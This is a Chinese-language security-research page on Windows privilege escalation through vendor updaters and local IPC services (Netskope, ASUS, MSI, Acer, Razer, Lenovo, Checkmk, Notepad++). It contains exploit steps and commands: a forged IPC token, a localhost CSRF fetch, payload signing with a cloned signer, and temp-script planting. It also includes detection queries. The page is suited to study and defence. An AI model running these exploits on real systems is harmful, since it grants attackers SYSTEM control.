# 滥用企业自动更新程序和特权 IPC（例如 Netskope、ASUS 和 MSI）

{{#include ../../banners/hacktricks-training.md}}

本页概述了一类 Windows 本地权限提升链：这类问题存在于企业终端代理和更新程序中，它们暴露了易于利用的 IPC 接口和特权更新流程。一个典型示例是 Netskope Client for Windows < R129（CVE-2025-0309）：低权限用户可以诱使程序向攻击者控制的服务器重新注册，然后投放恶意 MSI，由 SYSTEM 服务安装。<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

可复用于类似产品的关键思路：
- 滥用特权服务的 localhost IPC，强制其向攻击者服务器重新注册或重新配置。
- 实现厂商的更新端点，投放恶意 Trusted Root CA，并让更新程序指向恶意的“已签名”软件包。
- 绕过薄弱的签名者检查（CN 白名单）、可选摘要标志和宽松的 MSI 属性。
- 如果 IPC 使用了“加密”，则从注册表中 world-readable 的机器标识符推导密钥/IV。
- 如果服务根据映像路径/进程名称限制调用方，则可注入允许名单中的进程，或挂起启动该进程，再通过最小化的线程上下文补丁引导加载 DLL。

即使自定义本地 TCP 服务要求提供 PIN 或其他应用程序凭据，也应对其身份和输入边界进行同等审查。将监听器映射到其进程和有效服务帐户，然后检查实际部署的二进制文件/版本，并确认在将调用方可控字段复制到固定缓冲区或用于构造子进程命令之前，是否进行了长度检查。[Microsoft 的缓冲区溢出防护指南](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns)说明了未经检查的外部输入为何会对特权原生代码造成危险。仅有 loopback 监听器、硬编码凭据或进程名称，并不能证明存在内存破坏或 SYSTEM 执行；可达性、授权、代码路径和缓解措施仍是彼此独立的条件。常规枚举应保持被动，不要向正在运行的服务发送足以导致崩溃的长度输入。

---
## 1) 通过 localhost IPC 强制向攻击者服务器注册

许多代理都附带一个用户模式 UI 进程，它通过 localhost TCP 使用 JSON 与 SYSTEM 服务通信。

Netskope 中观察到的情况：
- UI：stAgentUI（低完整性）↔ Service：stAgentSvc（SYSTEM）
- IPC command ID 148：IDP_USER_PROVISIONING_WITH_TOKEN

利用流程：
1) 构造一个 JWT 注册令牌，其声明可控制后端主机（例如 AddonUrl）。使用 alg=None，无需签名。
2) 发送调用注册命令的 IPC 消息，并附上你的 JWT 和租户名称：

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) 服务开始向你的 rogue server 请求 enrollment/config，例如：
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

注意：
- 如果调用方验证基于路径/名称，请从 allow-listed vendor binary 发起请求（参见 §4）。<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) 劫持更新通道，以 SYSTEM 身份运行代码

客户端开始与你的服务器通信后，实现预期的 endpoints，并引导它获取攻击者的 MSI。典型流程：

1) /v2/config/org/clientconfig → 返回 JSON config，其中 updater interval 设得非常短，例如：
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → 返回 PEM CA 证书。服务会将其安装到 Local Machine Trusted Root 存储区。
3) /v2/checkupdate → 提供指向恶意 MSI 和虚假版本的元数据。

绕过常见检查的方式：
- Signer CN allow-list：服务可能只检查 Subject CN 是否等于 “netSkope Inc” 或 “Netskope, Inc.”。你的 rogue CA 可以签发具有该 CN 的叶证书，并为 MSI 签名。
- CERT_DIGEST 属性：加入一个名为 CERT_DIGEST 的无害 MSI 属性。安装时不会执行强制检查。
- 可选摘要强制验证：配置标志（例如 check_msi_digest=false）会禁用额外的加密验证。

结果：SYSTEM 服务会从
C:\ProgramData\Netskope\stAgent\data\*.msi
安装你的 MSI，以 NT AUTHORITY\SYSTEM 身份执行任意代码。<sup>[[1]](#references)[[2]](#references)</sup>

补丁绕过的经验：如果厂商的应对方式是允许一小组“可信”域名，而不是通过加密方式验证更新源，就要寻找仍允许你控制流量的厂商自有重定向器或反向代理。在 Netskope 的案例中，公开的后续研究显示，R129 时代的 allow-list 仍可通过 `rproxy.goskope.com` 滥用；该服务会代理由攻击者控制的 Azure App Service 内容。应将主机名 allow-list 视为一道减速带，而非信任边界。<sup>[[14]](#references)</sup>

---
## 3) 伪造加密的 IPC 请求（如果存在）

从 R127 开始，Netskope 将 IPC JSON 封装在看似 Base64 的 encryptData 字段中。逆向分析发现，它使用 AES，密钥和 IV 来自任何用户都可读取的注册表值：
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

攻击者可以复现加密，并以标准用户身份发送有效的加密命令。<sup>[[1]](#references)[[2]](#references)</sup> 通用提示：如果某个 agent 突然开始对其 IPC 进行“加密”，就要检查 HKLM 下的设备 ID、产品 GUID、安装 ID 等材料。

---
## 4) 绕过 IPC 调用方 allow-list（路径/名称检查）

一些服务会尝试通过解析 TCP 连接的 PID，并将映像路径/名称与位于 Program Files 下的厂商二进制文件 allow-list 进行比较，以验证对端身份（例如 stagentui.exe、bwansvc.exe、epdlp.exe）。

两种实用的绕过方法：
- 对 allow-list 中的进程（例如 nsdiag.exe）进行 DLL injection，并从进程内部代理 IPC。
- 以挂起状态启动 allow-list 中的二进制文件，并在不使用 CreateRemoteThread 的情况下引导加载你的代理 DLL（见 §5），以满足驱动强制执行的防篡改规则。<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) 兼容防篡改保护的 injection：挂起进程 + NtContinue 补丁

产品通常会附带 minifilter/OB callbacks 驱动（例如 Stadrv），用于从指向受保护进程的句柄中移除危险权限：
- Process：移除 PROCESS_TERMINATE、PROCESS_CREATE_THREAD、PROCESS_VM_READ、PROCESS_DUP_HANDLE、PROCESS_SUSPEND_RESUME
- Thread：限制为 THREAD_GET_CONTEXT、THREAD_QUERY_LIMITED_INFORMATION、THREAD_RESUME、SYNCHRONIZE

一种遵守这些限制的可靠 user-mode loader：
1) 使用 CREATE_SUSPENDED 创建厂商二进制文件的进程。
2) 获取仍被允许的句柄：进程句柄权限为 PROCESS_VM_WRITE | PROCESS_VM_OPERATION，以及具有 THREAD_GET_CONTEXT/THREAD_SET_CONTEXT 权限的线程句柄（或者，如果你在已知 RIP 处修补代码，则只需 THREAD_RESUME）。
3) 用一个微型 stub 覆盖 ntdll!NtContinue（或其他早期且保证已映射的 thunk）；该 stub 会调用 LoadLibraryW 加载你的 DLL 路径，然后跳回。
4) 调用 ResumeThread，在进程内触发 stub，从而加载你的 DLL。

由于你没有对一个已经受保护的进程使用 PROCESS_CREATE_THREAD 或 PROCESS_SUSPEND_RESUME（该进程是由你创建的），因此符合驱动的策略。<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) 实用工具
- NachoVPN（Netskope plugin）可自动创建 rogue CA、为恶意 MSI 签名，并提供所需端点：/v2/config/org/clientconfig、/config/ca/cert、/v2/checkupdate。<sup>[[3]](#references)</sup>
- UpSkope 是一个自定义 IPC 客户端，可构造任意 IPC 消息（可选 AES 加密），并包含挂起进程 injection 功能，以 allow-list 中的二进制文件作为消息来源。<sup>[[4]](#references)</sup>

## 7) 未知 updater/IPC 接口的快速初步排查流程

面对新的 endpoint agent 或主板“helper”套件时，通常只需快速执行以下流程，就足以判断它是否是一个值得关注的 privesc 目标：<sup>[[6]](#references)</sup>

1) 枚举 loopback 监听端口，并将其关联到厂商进程：

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) 枚举候选命名管道：

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) 挖掘基于插件的 IPC 服务器使用的注册表路由数据：

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) 首先从用户态客户端提取 endpoint 名称、JSON 键和 command ID。打包的 Electron/.NET 前端经常会 leak 完整的 schema：

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) 寻找实际的信任判定条件，而不只是最终启动进程的代码路径：

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

值得优先关注的模式：
- 如果使用 `CryptQueryObject`/证书解析，却没有调用 `WinVerifyTrust`，通常意味着代码把“证书存在”当成了“证书可信”，从而可能被用于克隆证书或其他伪造签名者的技巧。
- 对 `Origin`、`Referer`、下载 URL、进程名或签名者 CN 做子串/后缀检查并不能完成身份验证。`contains(".vendor.com")` 通常可被攻击者控制的仿冒域名利用。
- 如果低权限 GUI 决定“文件可信”，而 SYSTEM broker 只是使用这个判断结果，那么修补或重新实现客户端 DLL/JS 往往就能完全绕过这道边界（类似 Razer 的 split validation）。
- 如果 broker 将 payload 复制到 `%TEMP%`/`C:\Windows\Temp`，然后从该路径验证或安排执行，请立即测试 TOCTOU 替换窗口，并检查是否有提供检查较弱的备用 `ExecuteTask()` 封装的同级 plugin 模块。<sup>[[6]](#references)</sup>

对于大量使用 named pipe 的目标，PipeViewer 可以快速发现 DACL 薄弱以及可远程访问的 pipe，让你在深入逆向协议之前先定位问题。<sup>[[11]](#references)</sup>

如果目标只通过 PID、映像路径或进程名验证调用方，应将其视为障碍而非安全边界：注入合法客户端，或通过允许列表中的进程发起连接，往往就足以通过服务器的检查。对于 named pipe，[此页面介绍的客户端模拟与 pipe 滥用](named-pipe-client-impersonation.md) 对相关原语有更深入的说明。

对于特权 **清理或还原 broker**，除了 pipe ACL，还要检查路径信任边界。即使服务可执行文件及其安装目录受到保护，低权限调用方仍可能在共享目录中选择还原目标，或重命名暂存的备份文件。请分别确认调用方能否访问还原命令、能否修改准确的暂存输入文件或文件名、broker 是否以更高权限身份运行，以及其还原操作是否确实写入所选的受保护路径。暂存目录可写或 pipe 可读，本身并不能证明存在任意特权写入；需要通过代码审查或受控测试确认目标路径映射及服务行为。被动枚举时不要调用未知的清理命令，因为它可能会删除用户文件。

---
## 8) 仅通过厂商签名认证的模块化 add-in broker（Lenovo Vantage 模式）

值得关注的一种新变体是 **signed-client RPC broker**：低权限的 Lenovo 签名桌面进程与 SYSTEM 服务通信，而服务会将 JSON 命令路由到 `%ProgramData%` 下由 XML 描述的一组 add-in。一旦在任何受认可的签名客户端**中**实现代码执行，每个 `runas="system"` contract 都会成为攻击面的一部分。<sup>[[15]](#references)</sup>

Lenovo Vantage 研究中观察到的高价值原语：
- **因调用方由厂商签名而信任它**：研究人员将 Lenovo 签名的 EXE 复制到可写目录，并满足 DLL side-load（`profapi.dll`），从而在服务已信任的客户端中执行任意代码，进入通过认证的上下文。
- **通过 manifest 发现攻击面**：add-in 在 `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` 下声明；有多个 contract 以 `SYSTEM` 身份运行，因此枚举这些 manifest 往往比逆向 broker 本身更快发现真正的特权操作。
- **认证通道背后的单命令漏洞**：进入受信任客户端后，公开研究发现更新/安装操作中的路径遍历与竞态条件、特权设置数据库中的原始 SQL 滥用，以及基于子串的注册表路径检查漏洞；后者可导致写入预期 hive 之外的位置。

目标上的实用侦察：

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

实用要点：每当某个 helper suite 暴露一个 broker，先对 **caller process** 进行身份验证，然后才分发到数十个 plugin/add-in 命令时，不要在绕过前端信任检查后就此止步。转储 manifest/contract 表，并分别 fuzz 每个高权限 verb；经过身份验证的通道通常还隐藏着多个二阶段漏洞。

---
## 1) 针对特权 HTTP API 的 Browser-to-localhost CSRF（ASUS DriverHub）

DriverHub 随附一个用户模式 HTTP 服务（ADU.exe），运行在 127.0.0.1:53000 上；该服务要求浏览器请求来自 https://driverhub.asus.com。Origin 过滤器只是在 Origin header 和 `/asus/v1.0/*` 暴露的下载 URL 上执行 `string_contains(".asus.com")`。因此，任何攻击者控制的主机（例如 `https://driverhub.asus.com.attacker.tld`）都会通过检查，并能通过 JavaScript 发起会改变状态的请求。<sup>[[6]](#references)</sup> 更多绕过模式请参阅 [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md)。

实际流程：
1) 注册一个包含 `.asus.com` 的域名，并在其上托管恶意网页。
2) 使用 `fetch` 或 XHR 调用 `http://127.0.0.1:53000` 上的特权 endpoint（例如 `Reboot`、`UpdateApp`）。
3) 发送 handler 预期的 JSON body——打包后的前端 JS 展示了以下 schema。

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

即使将 Origin header 欺骗为受信任值，下方展示的 PowerShell CLI 也能成功：

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

因此，任何对攻击者站点的浏览器访问都会变成一次 1-click（或通过 `onload` 实现 0-click）的本地 CSRF，从而驱动一个 SYSTEM helper。

---
## 2) 不安全的代码签名验证与证书克隆（ASUS UpdateApp）

`/asus/v1.0/UpdateApp` 会下载由 JSON 请求体指定的任意可执行文件，并将其缓存到 `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`。下载 URL 验证采用相同的子字符串逻辑，因此 `http://updates.asus.com.attacker.tld:8000/payload.exe` 会被接受。下载完成后，ADU.exe 只会检查 PE 是否包含签名，以及 Subject 字符串是否与 ASUS 匹配，然后就运行该文件——没有 `WinVerifyTrust`，也没有证书链验证。

要利用这一流程：
1) 创建 payload（例如，`msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`）。
2) 将 ASUS 的签名者克隆到其中（例如，`python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`）。
3) 将 `pwn.exe` 托管在仿冒 `.asus.com` 的域名上，并通过上述浏览器 CSRF 触发 UpdateApp。

由于 Origin 和 URL 筛选器都基于子字符串匹配，而签名者检查只比较字符串，DriverHub 会在提升后的上下文中下载并执行攻击者的二进制文件。<sup>[[6]](#references)</sup>

---
## 1) 更新程序复制/执行路径中的 TOCTOU（MSI Center CMD_AutoUpdateSDK）

MSI Center 的 SYSTEM 服务公开了一个 TCP 协议，其中每个帧的格式为 `4-byte ComponentID || 8-byte CommandID || ASCII arguments`。核心组件（Component ID `0f 27 00 00`）包含 `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`。其处理程序会：
1) 将提供的可执行文件复制到 `C:\Windows\Temp\MSI Center SDK.exe`。
2) 通过 `CS_CommonAPI.EX_CA::Verify` 验证签名（证书 Subject 必须等于 “MICRO-STAR INTERNATIONAL CO., LTD.”，且 `WinVerifyTrust` 必须成功）。
3) 创建一个计划任务，以 SYSTEM 身份运行该临时文件，并使用攻击者控制的参数。

在验证和 `ExecuteTask()` 之间，复制的文件不会被锁定。攻击者可以：
- 发送指向 MSI 正版签名二进制文件的 Frame A（确保签名检查通过，并将任务加入队列）。
- 通过反复发送指向恶意 payload 的 Frame B 与之竞速，在验证完成后立即覆盖 `MSI Center SDK.exe`。

计划任务触发时，会以 SYSTEM 身份执行被覆盖的 payload，尽管最初验证的是原始文件。可靠的利用方式是使用两个 goroutine/thread，不断发送 CMD_AutoUpdateSDK，直到抢占 TOCTOU 窗口。<sup>[[6]](#references)</sup>

---
## 2) 滥用自定义 SYSTEM 级 IPC 与 impersonation（MSI Center + Acer Control Centre）

### MSI Center TCP 命令集
- `MSI.CentralServer.exe` 加载的每个插件/DLL 都会获得一个 Component ID，该 ID 存储在 `HKLM\SOFTWARE\MSI\MSI_CentralServer` 下。帧的前 4 个字节用于选择该组件，因此攻击者可以将命令路由到任意模块。
- 插件可以定义自己的任务运行器。`Support\API_Support.dll` 暴露了 `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}`，并直接调用 `API_Support.EX_Task::ExecuteTask()`，**不进行任何签名验证**——任何本地用户都可以将其指向 `C:\Users\<user>\Desktop\payload.exe`，从而稳定地获得 SYSTEM 执行权限。
- 使用 Wireshark 嗅探 loopback 流量，或在 dnSpy 中对 .NET 二进制文件进行插桩，可以快速揭示 Component 与命令的映射关系；随后即可使用自定义 Go/Python 客户端重放这些帧。<sup>[[6]](#references)</sup>

### Acer Control Centre 命名管道与 impersonation levels
- `ACCSvc.exe`（SYSTEM）公开了 `\\.\pipe\treadstone_service_LightMode`，其 discretionary ACL 允许远程客户端访问（例如 `\\TARGET\pipe\treadstone_service_LightMode`）。发送带有文件路径的命令 ID `7` 会调用该服务的进程创建例程。
- 客户端库会将一个 magic terminator 字节（113）与参数一起序列化。使用 Frida/`TsDotNetLib` 进行动态插桩（有关插桩技巧，请参见 [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md)）后可以发现，本机处理程序会在调用 `CreateProcessAsUser` 之前，将该值映射到 `SECURITY_IMPERSONATION_LEVEL` 和完整性 SID。
- 将 113（`0x71`）替换为 114（`0x72`），即可进入通用分支，该分支保留完整的 SYSTEM token，并设置高完整性 SID（`S-1-16-12288`）。因此，生成的二进制文件会以不受限制的 SYSTEM 身份运行，无论是在本地还是跨机器。
- 将此问题与公开的安装程序标志（`Setup.exe -nocheck`）结合，即使在实验室 VM 上也能安装 ACC，并测试该管道，无需厂商硬件。<sup>[[6]](#references)</sup>

这些 IPC 漏洞凸显了 localhost 服务必须实施双向身份验证（ALPC SIDs、`ImpersonationLevel=Impersonation` 筛选、token filtering），也说明每个模块中“运行任意二进制文件”的 helper 都必须采用相同的签名验证。

---
## 3) 由薄弱用户模式验证支持的 COM/IPC “elevator” helper（Razer Synapse 4）

Razer Synapse 4 为这类问题增添了另一种有用模式：低权限用户可以通过 COM helper `RzUtility.Elevator` 请求启动进程，而信任判断委托给了用户模式 DLL（`simple_service.dll`），并未在特权边界内得到可靠执行。

观察到的利用路径：
- 实例化 COM 对象 `RzUtility.Elevator`。
- 调用 `LaunchProcessNoWait(<path>, "", 1)` 请求提升权限后启动。
- 在公开的 PoC 中，发出请求前会补丁移除 `simple_service.dll` 内的 PE 签名检查，因此可以启动攻击者指定的任意可执行文件。<sup>[[6]](#references)[[10]](#references)</sup>

最简 PowerShell 调用：

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

总体要点：逆向分析“helper”套件时，不要只检查 localhost TCP 或命名管道。还要检查名称类似 `Elevator`、`Launcher`、`Updater` 或 `Utility` 的 COM 类，然后确认高权限服务是否会自行验证目标二进制文件，还是仅仅信任可被 patch 的用户态客户端 DLL 所计算出的结果。这种模式不只出现在 Razer：任何由高权限 broker 接收低权限端 allow/deny 决策的拆分式设计，都可能存在 privesc 攻击面。


---
## MSI 修复期间可预测的临时脚本执行（Checkmk Agent / CVE-2024-0670）

一些 Windows agent 仍通过在 `C:\Windows\Temp` 中写入临时 `.cmd` 文件，并以 `SYSTEM` 身份执行它来实现特权操作。如果文件名可预测，且服务未能安全地重新创建已有文件，低权限用户就可以预先创建未来要用的临时文件并将其设为**只读**，使特权进程执行攻击者控制的内容，而不是自己的脚本。

在存在漏洞的 Checkmk Agent 版本中观察到：
- 临时文件命名模式：`cmk_all_<PID>_1.cmd`
- 受影响分支：`2.0.0`、`2.1.0`、`2.2.0`
- 触发方式：修复缓存的 agent 软件包 MSI<sup>[[8]](#references)[[9]](#references)</sup>

实际操作流程：
1. 根据当前进程 ID 或正在运行的 agent PID，估算合理的 PID 范围。
2. 编写简短的 **ASCII** `.cmd` payload（使用 `Set-Content -Encoding Ascii` 或 `cmd.exe` 重定向；避免 PowerShell 将批处理文件输出为 UTF-16）。
3. 在候选范围内，将 `C:\Windows\Temp\cmk_all_<PID>_1.cmd` 批量写入，并将每个文件设为只读。
4. 触发对缓存 MSI 的修复操作，使特权服务尝试重新生成并执行临时脚本。<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

如果易受攻击的产品是通过 Windows Installer 安装的，请先将 `C:\Windows\Installer` 下看似随机命名的缓存 MSI 文件映射回其产品名称，再触发修复：<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

操作说明：
- 当 `msiexec /fa` 在非交互式 WinRM shell 中失败，且你需要确认现有桌面会话/断开连接的会话是否能正确触发修复时，`qwinsta` 很有用。<sup>[[7]](#references)</sup>
- 这一模式也适用于其他端点代理和更新程序：它们会**在所有用户可写的位置暂存临时脚本，随后以 SYSTEM 身份执行**。检查名称是否可预测、是否缺少排他创建语义，以及修复/更新流程能否按需触发。

### 交互式安装程序修复与特权控制台

PDF24 Creator 11.15.1 展示了另一类 MSI 修复风险：其打印机安装自定义操作可能在修复期间以 SYSTEM 权限启动一个可见控制台。供应商在 11.15.2 中修改了 MSI 安装程序以解决此行为。旧版产品只是初步排查线索。请检查已注册或可访问的 MSI 安装包、当前用户能否启动修复、易受攻击的自定义操作和日志文件延迟是否存在，以及交互式桌面能否显示该控制台。据报告，相关延迟利用了针对 `faxPrnInst.log` 的 oplock；普通的文件可写权限并非唯一访问条件。非交互式 shell、无法访问安装包或已修补的安装程序都可能中断利用链。此问题不依赖 `AlwaysInstallElevated`，也不同于替换可预测的临时脚本。

---
## 通过薄弱的更新程序验证实施远程供应链劫持（WinGUp / Notepad++）

2025 年 6 月至 2025 年 12 月期间，攻陷 Notepad++ 更新流程背后托管基础设施的攻击者，选择性地向特定受害者提供恶意清单。较旧的 WinGUp 更新程序未能充分验证更新的真实性，因此恶意 XML 响应可以将客户端重定向到攻击者控制的 URL。由于客户端接受了 HTTPS 内容，却未强制验证受信任的证书链以及已下载安装程序的有效 PE 签名，受害者下载并执行了被植入木马的 NSIS `update.exe`。<sup>[[12]](#references)[[13]](#references)</sup>

操作流程（无需本地漏洞利用）：
1. **拦截基础设施**：攻陷 CDN/托管服务，并在响应更新检查时返回指向恶意下载 URL 的攻击者元数据。
2. **植入木马的 NSIS**：安装程序会下载/执行 payload，并滥用两条执行链：
   - **自带签名二进制文件并侧载**：捆绑已签名的 Bitdefender `BluetoothService.exe`，并在其搜索路径中放置恶意 `log.dll`。运行该已签名二进制文件时，Windows 会侧载 `log.dll`，后者解密并反射式加载 Chrysalis backdoor（使用 Warbird 保护和 API hashing 来阻碍静态检测）。
   - **脚本化 shellcode 注入**：NSIS 执行编译后的 Lua 脚本，该脚本使用 Win32 API（例如 `EnumWindowStationsW`）注入 shellcode 并暂存 Cobalt Strike Beacon。<sup>[[12]](#references)</sup>

适用于任何自动更新程序的加固/检测要点：
- 对已下载的安装程序强制执行**证书和签名验证**（固定供应商签名者，拒绝不匹配的 CN/证书链），并对更新清单本身进行签名（例如使用 XMLDSig）。未经验证，不要允许由清单控制的重定向。
- 将**自带签名二进制文件侧载**视为下载后的检测切入点：当已签名的供应商 EXE 从其标准安装路径之外加载 DLL 名称（例如 Bitdefender 从 Temp/Downloads 加载 `log.dll`），或更新程序从临时目录释放/执行非供应商签名的安装程序时发出告警。
- 监控此利用链中观察到的**恶意软件特定特征**（可用作通用排查线索）：互斥体 `Global\Jdhfv_1.0.1`、`gup.exe` 异常写入 `%TEMP%`，以及 Lua 驱动的 shellcode 注入阶段。
- Notepad++ 从 v8.8.9 起加强了 WinGUp：现在返回的 XML 会经过签名（XMLDSig），较新版本还会强制验证已下载安装程序的证书和签名，而不再单纯信任传输过程。<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender 签名 EXE 侧载 <code>log.dll</code> (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> 启动非 Notepad++ 安装程序</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

这些模式适用于任何接受未签名清单或未能固定安装程序签名者的更新程序——网络劫持 + 恶意安装程序 + BYO 签名侧载，可在“可信”更新的幌子下实现远程代码执行。

---
## References
- [1] [安全公告 – Netskope Client for Windows – 通过恶意服务器实现本地权限提升（CVE-2025-0309）](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope 安全公告 NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope 插件](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC 客户端/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [Pwning ASUS DriverHub、MSI Center、Acer Control Centre 和 Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – 利用 Checkmk Agent 中的可写文件实现本地权限提升](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Windows agent 中的权限提升](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – 国家级行为者利用 Notepad++ 供应链](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – 基础设施遭劫持事件更新](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – 绕过 Netskope Client for Windows 中 CVE-2025-0309 的修复](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – 揭露 Lenovo Vantage 中的权限提升漏洞](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
{{#include ../../banners/hacktricks-training.md}}
